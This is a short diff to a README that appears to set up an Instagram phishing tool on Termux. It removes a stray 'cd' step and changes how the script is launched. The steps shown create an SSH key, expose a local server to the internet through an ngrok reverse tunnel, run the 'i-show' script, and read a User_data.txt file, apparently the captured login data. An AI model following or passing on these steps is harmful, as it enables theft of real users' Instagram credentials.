@@ -31,9 +31,6 @@ instagram
 localhost
 ```
 ### Termux New SESSION 
-```
-cd
-```
 ### Create a new Password
 ```
 ssh-keygen -t rsa -b 2048
@@ -48,7 +45,7 @@ ssh -R 443:localhost:8080 v2@connect.ngrok-agent.com http
 yes
 ```
 ```
-cd Instagram && bash i-show
+bash Instagram/i-show
 ```
 ```
 cat /storage/emulated/0/Download/User_data.txt
